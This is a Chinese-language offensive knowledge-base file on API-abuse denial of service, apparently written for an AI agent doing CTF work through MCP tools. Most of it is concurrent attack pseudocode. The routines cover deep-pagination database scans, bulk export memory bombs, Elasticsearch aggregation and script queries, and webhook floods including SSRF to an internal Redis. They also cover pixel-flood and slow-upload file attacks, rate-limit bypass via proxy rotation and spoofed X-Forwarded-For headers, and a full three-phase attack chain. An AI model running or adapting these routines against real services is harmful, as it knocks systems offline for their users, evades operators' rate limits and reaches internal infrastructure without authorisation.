# API 滥用拒绝服务

## 场景

现代应用以 API 为中心，REST/GraphQL/gRPC 端点暴露了大量可被滥用的操作。API 的"合法"功能本身可能成为 DoS 向量：批量操作、分页遍历、Webhook 回调、文件上传、搜索接口等，攻击者以合法身份调用合法 API，但以破坏性方式使用。

```
API 层 DoS 核心矛盾:
  - 攻击请求看起来合法 (有效 token、正常参数)
  - 但资源消耗远超正常用户
  - WAF 难以区分合法用户与 API 滥用者
```

## 输入信号

- API 分页参数中 `page` 值异常大 (> 10000)，或 `cursor` 值为明显构造的极端值
- 批量操作端点请求频率异常 (1 个 /api/bulk 请求 > 100 个单条请求的等效负载)
- 搜索/查询接口接收 `q=*` 或 `q=a` 等宽泛匹配请求，响应时间异常长
- API 限速计数器被分散在不同 IP/Header 组合下，但行为模式完全一致
- 响应体体积与请求体体积比值异常 (> 100x: 1KB 请求 → 200MB 响应)
- 文件上传端点接收大量小文件 (inode 耗尽) 或多个声称大尺寸的文件 (Content-Length 1GB)
- Webhook 回调端点出现大量 timeout，outgoing 连接数接近应用上限
- 同一 User-Agent + 不同 X-Forwarded-For → 明显的限速绕过尝试
- 导出/报表端点被频繁调用，生成大体积文件，应用内存使用线性增长

---

## 方法 1: Pagination Abuse — 分页全量遍历

### 原理

无限制的分页偏移可触及数据库深处，每次请求触发大量 offset-skip 扫描。

```
正常用户:
  GET /api/users?page=1&per_page=20  → SELECT * FROM users LIMIT 20 OFFSET 0

攻击者:
  GET /api/users?page=500000&per_page=20  → SELECT * FROM users LIMIT 20 OFFSET 10,000,000
  
数据库:
  即使 LIMIT 20，仍需扫描并跳过 10,000,000 行
  PostgreSQL SeqScan: 10M 行 → 数秒
  MySQL InnoDB: 扫描 10M 行 primary key → 大量磁盘 IO
```

### 伪代码

```
function pagination_abuse(api_url, token, table_size_estimate):
    """
    深度分页消耗数据库
    """
    
    # 探测页数上限
    # 二分法快速定位最后一页
    lo, hi = 0, 1_000_000_000
    while lo < hi:
        mid = (lo + hi) // 2
        resp = api_get(f"{api_url}?page={mid}&per_page=1", token)
        if resp.status == 200 and resp.body.data:
            lo = mid + 1
        else:
            hi = mid
    
    max_page = lo
    print(f"[*] Max page: {max_page}")
    
    # 并发请求末尾页数 → 数据库持续全表扫描
    for _ in range(50):
        spawn:
            for p in range(max_page - 100, max_page):
                resp = api_get(
                    f"{api_url}?page={p}&per_page=100",
                    token
                )
    
    # 叠加: 同时请求头/中/尾
    # → 多个数据库连接同时扫描不同 offset
    # → IOPS 打满
```

### 游标分页也并非安全

```
# 游标分页 (cursor-based) 比 offset 好，但也可被滥用:
GET /api/users?cursor=eyJpZCI6OTk5OTk5OX0&limit=50

# 攻击:
# 用二分法或猜测找到最大 cursor 值
# 并发请求尾部 cursor
# 如果 cursor 字段无索引 → 同样全表扫描
# 如果用 ULID/Snowflake ID 作为 cursor → 可预测 → 直接构造尾部 cursor
```

## 方法 2: 批量操作放大

### 原理

单次操作 x N 个对象 → 单请求触发 N 倍后端工作。

```
正常:
  POST /api/send-notification  { user_id: 123, message: "hi" }
  → 1 次推送

批量:
  POST /api/send-notifications { 
    users: [1, 2, 3, ..., 10000],
    message: "hi"
  }
  → 10000 次推送
  
配合:
  POST /api/export { filters: {} }  → 导出 1000 万条记录
  → 内存 OOM
```

### 伪代码

```
function bulk_operation_abuse(api_url, token):
    """
    批量操作 API 滥用
    
    目标:
      - 批量创建/更新/删除
      - 批量导出/报表
      - 批量通知/邮件
      - 批量查询 (N+1 放大)
    """
    
    # 1. 发现批量端点
    endpoints = [
        "/api/bulk",
        "/api/batch",
        "/api/v2/import",
        "/api/admin/export",
        "/api/reports/generate",
        "/api/users/bulk-invite",
    ]
    
    for ep in endpoints:
        resp = api_get(f"{api_url}{ep}", token)
        if resp.status != 404:
            print(f"[*] Found bulk endpoint: {ep}")
    
    # 2. 批量创建 (资源耗尽的温和方式)
    # 创建 10000 个资源 → 每个都有 DB 行 + 索引更新
    for _ in range(100):
        spawn:
            api_post(
                f"{api_url}/api/bulk",
                token,
                body={
                    "action": "create",
                    "resource": "items",
                    "data": [{...} for _ in range(1000)]
                }
            )
    
    # 3. 批量导出 → 内存炸弹
    # 请求导出所有数据为 CSV/Excel → 服务端内存中构建整个数据集
    for _ in range(10):
        spawn:
            api_post(
                f"{api_url}/api/export",
                token,
                body={
                    "format": "xlsx",
                    "filters": {},  # 空过滤 → 导出所有
                    "include_relations": True,
                    "include_deleted": True,
                }
            )
    
    # 4. N+1 查询放大的批量端点
    # 如果批量查询自动 include 关联对象
    # 100 × 20 关联 = 2000 个 DB 查询
```

## 方法 3: API 限速绕过

### 原理

绕过 API rate limit 使攻击持续有效。

```
限速绕过技术:

1. Header 操控:
   X-Forwarded-For: 轮换 IP
   X-Real-IP: 同上
   
2. 多租户/Tenant ID 轮换:
   如果限速按 tenant 计算
   不同 tenant_id → 独立计数器
   
3. OAuth 2.0 client_id 轮换:
   如果限速按 client_id
   注册多个 client → 独立配额
   
4. 时间窗口重置竞争:
   限速窗口: 每分钟 100 次
   在窗口末尾和下一窗口开头同时发包 → 200 次/秒
   
5. 不同端点独立配额:
   /api/data?page=1 (限速 endpoint A)
   /api/data/batch (限速 endpoint B)
   /api/data/export (限速 endpoint C)
   → 同时打 3 个 → 实际 3x 配额
   
6. HTTP/2 多 stream:
   同一连接不同 stream 并发 → 按连接限速时完全无效
```

### 伪代码

```
function rate_limit_bypass(api_url, token, requests_per_sec=10000):
    """
    综合限速绕过
    """
    
    # 策略1: IP 轮换
    proxies = load_proxy_list(1000)  # 1000 个代理
    
    for i in range(requests_per_sec):
        proxy = proxies[i % len(proxies)]
        spawn:
            api_get(api_url, token, proxy=proxy)
    
    # 策略2: Header 操控 (如果限速按 X-Forwarded-For)
    for i in range(requests_per_sec):
        fake_ip = random_public_ip()
        spawn:
            api_get(api_url, token, headers={
                "X-Forwarded-For": fake_ip,
                "X-Real-IP": fake_ip,
            })
    
    # 策略3: 多端点并发
    endpoints = [
        "/api/v1/data",
        "/api/v2/data",       # 不同版本 → 不同限速桶
        "/api/data/batch",
        "/api/data/search",
        "/graphql",           # GraphQL 端点 → 独立限速
        "/api/internal/data", # 内部端点 → 可能无限速
        "/api/admin/data",    # 管理端点
    ]
    
    for ep in endpoints:
        for _ in range(requests_per_sec // len(endpoints)):
            spawn:
                api_get(f"{api_url}{ep}", token)
```

## 方法 4: Search API 滥用

### 原理

搜索接口是数据库最昂贵的操作之一：全文索引、模糊匹配、聚合计算。攻击者发送高开销搜索使数据库不可用。

```
高开销搜索模式:

1. 宽泛查询:
   q=* 或 q=a → 匹配所有文档 → 返回百万结果

2. 深度分页搜索:
   q=*&page=999999 → 数据库跳过 1000 万行

3. 聚合爆炸:
   aggs: {by_date: {date_histogram: ...}, 
          by_user: {terms: {size: 1000000}},
          by_tag: {terms: {size: 1000000}}}
   → Elasticsearch 分配数 GB 内存做聚合

4. 模糊搜索:
   q=aaaaaaaaaaaaaa~10  → 编辑距离 10 → 大量候选

5. Regex 搜索:
   q=/(a+)+/  → 触发搜索后端的 ReDoS

6. 通配符前缀:
   q=a* 或 q=*a* → 全索引扫描
```

### 伪代码

```
function search_api_abuse(search_url, token):
    """
    滥用搜索 API 消耗后端资源
    """
    
    # 1. 聚合爆炸 (Elasticsearch/OpenSearch)
    payload = {
        "size": 0,  # 不取结果，仅聚合
        "aggs": {
            "deep_agg_1": {
                "terms": {"field": "user_id", "size": 1000000},
                "aggs": {
                    "deep_agg_2": {
                        "terms": {"field": "session_id", "size": 1000000},
                        "aggs": {
                            "deep_agg_3": {
                                "terms": {"field": "item_id", "size": 1000000}
                            }
                        }
                    }
                }
            }
        }
    }
    
    for _ in range(10):
        spawn:
            api_post(search_url, token, body=payload)
    
    # 2. 昂贵脚本查询
    script_payload = {
        "query": {
            "script": {
                "script": {
                    "source": """
                        long total = 0;
                        for (int i = 0; i < 100000; i++) {
                            total += doc['price'].value;
                        }
                        return total;
                    """
                }
            }
        }
    }
    
    for _ in range(5):
        spawn:
            api_post(search_url, token, body=script_payload)
    
    # 3. 宽泛搜索 + 深度分页
    for p in range(10000, 10010):
        spawn:
            api_get(f"{search_url}?q=*&page={p}&size=1000", token)
```

## 方法 5: Webhook 回调洪泛

### 原理

利用 Webhook/回调机制，使目标服务器向大量 endpoint 发起请求，消耗 outgoing 连接和带宽，甚至利用目标服务器攻击第三方。

```
攻击:
  1. 注册 Webhook URL = 攻击者控制的慢速服务器
  2. 触发大量事件 → 目标服务器向攻击者服务器发送回调
  3. 攻击者服务器慢速响应 (Slowloris 逆向)
  4. 目标服务器 outgoing 连接池被慢速 Webhook 占满
  5. 后续合法 Webhook 无法发送

或者:
  1. 注册 Webhook URL = 第三方 httpbin/requestbin
  2. 触发大量事件 → 目标服务器轰炸第三方

或者:
  1. 注册 Webhook URL = 目标自身的内部端点 (SSRF 变种)
  2. 触发事件 → 目标自我攻击
```

### 伪代码

```
function webhook_abuse(api_url, token, internal_target=None):
    """
    Webhook 机制滥用
    
    目标:
      - 慢速 Webhook 耗尽 outgoing 连接池
      - Webhook 轰炸第三方
      - Webhook SSRF → 内部服务
    """
    
    # 1. 慢速 Webhook: 注册一个慢速响应的 endpoint
    slow_endpoints = [
        "https://slow-server.example.com/hook",  # 攻击者控制的慢速 server
        "https://httpbin.org/delay/30",          # 公开慢速 endpoint
    ]
    
    for hook_url in slow_endpoints:
        # 注册 Webhook
        api_post(f"{api_url}/api/webhooks", token, body={
            "url": hook_url,
            "events": ["*"],  # 订阅所有事件
            "active": True
        })
    
    # 2. 批量触发事件
    # 每个事件触发一次 Webhook 回调
    for _ in range(500):
        spawn:
            api_post(f"{api_url}/api/items", token, body={
                "name": "test_item",
                "data": "A" * 10000
            })
    
    # 效果: 500 个创建事件 → 500 个 Webhook 回调
    # 每个回调请求到慢速 endpoint → 卡住 30-60 秒
    # 服务器 outgoing 连接池被占满
    
    # 3. SSRF via Webhook
    if internal_target:
        api_post(f"{api_url}/api/webhooks", token, body={
            "url": f"http://{internal_target}:6379/",  # 内部 Redis
            "events": ["item.created"]
        })
        # 触发事件 → 目标服务器向内部 Redis 发 HTTP 请求
        # 可能注入 Redis 命令
```

## 方法 6: 文件上传 DoS

### 原理

文件上传端点可被滥用以消耗磁盘、内存和 CPU。

```
攻击向量:

1. 大文件上传 (Big File):
   单文件 >1GB → 磁盘占满

2. 大量小文件 (Inode Exhaustion):
   100 万 × 1KB 文件 → inode 耗尽

3. 像素级图片 (Pixel Flood):
   1 × 1 像素 PNG 声称尺寸 1000000 × 1000000
   → 解码器预分配 %d × %d × 4 = 4TB 内存

4. 压缩炸弹 (Zip Bomb via Upload):
   解压 42KB → 4.5PB

5. 多 part 上传:
   分片上传 + 永不完成 → 临时文件积压

6. EXIF 炸弹:
   嵌入恶意 EXIF 数据的图片
   → 解析库 CPU 满载
```

### 伪代码

```
function upload_abuse(upload_url, token):
    """
    文件上传端点滥用
    """
    
    # 1. Pixel Flood: 小文件声称大尺寸
    # 1×1 PNG → 修改 IHDR 声称 1,000,000×1,000,000
    pixel_bomb = create_pixel_flood_png(
        claimed_width=1_000_000,
        claimed_height=1_000_000,
        actual_width=1,
        actual_height=1
    )
    
    for _ in range(10):
        spawn:
            api_post_multipart(upload_url, token, files={
                "image": ("bomb.png", pixel_bomb, "image/png")
            })
    
    # 2. 大体积 + 慢速上传 (类似 RUDY)
    # 声明 Content-Length: 1GB，每 10 秒发 1 byte
    for _ in range(100):
        spawn:
            sock = tcp_connect(upload_url.host, upload_url.port)
            sock.send(
                f"POST /upload HTTP/1.1\r\n"
                f"Host: {upload_url.host}\r\n"
                f"Content-Type: multipart/form-data; boundary=xxx\r\n"
                f"Content-Length: 1073741824\r\n"  # 1GB
                f"\r\n"
            )
            # 慢速发送 body
            while True:
                sock.send(b"A")
                sleep(10)
    
    # 3. 并发小文件耗尽 inode
    for _ in range(1000):
        spawn:
            for i in range(1000):
                api_post_multipart(upload_url, token, files={
                    f"file_{i}": (f"f{i}.txt", b"x", "text/plain")
                })
```

## 攻击链

```
API 滥用综合方案:

Phase 1 — 探测:
  1. 枚举所有 API 端点 (批量/搜索/导出/上传/Webhook)
  2. 记录各端点的限速策略 (尝试触发 → 观察 429)
  3. 标识无限制或弱限制的端点

Phase 2 — 消耗:
  4. 搜索 API → 宽泛查询 + 聚合 → ES/DB CPU 100%
  5. 批量导出 → 内存 OOM
  6. 文件上传 → 磁盘耗尽

Phase 3 — 阻断:
  7. Webhook 慢速回调 → outgoing 连接池耗尽
  8. 深分页遍历 → DB IOPS 打满
  9. 多端点并发 + 限速绕过 → 全面压力
```

## 参考资料

1. "Rate Limiting: Attack and Defense" — Cloudflare, 2022
2. "How we learned to stop worrying and love the API: API abuse patterns" — OWASP API Security Top 10 (API10:2023)
3. "Pagination Attacks: Exhausting Database Connections" — PostgreSQL Wiki
4. "GraphQL Batch Attacks" — Apollo Security Advisory, 2019
5. "Webhook Security: Preventing callback abuse" — GitHub Security Lab
6. "Slow File-Upload DoS Attack" (R-U-Dead-Yet variant) — THC, 2010
7. "Zip bombs and decompression attacks in web applications" — Snyk, 2021
8. RFC 7230 — HTTP/1.1 Message Syntax and Routing (Content-Length abuse)
9. "API Security Encyclopedia" — Wallarm API Leak and Abuse patterns
10. "Elasticsearch: Preventing expensive queries" — Elasticsearch Guide

## MCP 工具映射

| 步骤 | 工具 | 说明 |
|------|------|------|
| API 枚举 | `http_probe` | 探测 API 端点及响应模式 |
| 技术搜索 | `kb_router` | 搜索 api_abuse / rate_limit / webhook |
| 技术查阅 | `kb_read_file` | 读取本文件 |

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
